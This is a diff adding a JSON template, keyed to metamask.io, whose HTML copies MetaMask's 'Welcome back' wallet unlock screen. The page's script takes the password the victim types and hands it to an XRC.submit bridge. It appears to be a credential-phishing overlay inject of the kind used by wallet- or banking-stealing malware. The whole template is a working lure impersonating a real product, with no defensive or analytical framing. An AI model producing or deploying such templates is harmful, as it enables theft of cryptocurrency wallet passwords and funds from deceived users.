@@ -1,0 +1,7 @@
+{
+  "id": "metamask",
+  "domain": "metamask.io",
+  "name": "MetaMask",
+  "type": "crypto",
+  "html": "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>MetaMask</title><style>body{margin:0;padding:0;background:#24272A;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff}.box{background:#24272A;padding:40px;width:90%;max-width:360px;text-align:center}.logo{font-size:22px;font-weight:bold;color:#fff;margin-bottom:8px}.sub{color:#9FA6AE;font-size:14px;margin-bottom:30px}input{width:100%;padding:14px;margin:8px 0;border:1px solid #3B4046;border-radius:8px;background:#141618;color:#fff;box-sizing:border-box;font-size:15px}input:focus{outline:none;border-color:#037DD6}button{width:100%;padding:14px;margin-top:16px;background:#037DD6;border:none;border-radius:100px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer}button:active{opacity:0.8}</style></head><body><div class='box'><div class='logo'>MetaMask</div><div class='sub'>Welcome back</div><input type='password' id='password' placeholder='Password'><button onclick='submit()'>Unlock</button></div><script>function submit(){var p=document.getElementById('password').value;XRC.submit(JSON.stringify({password:p}));}</script></body></html>"
+}
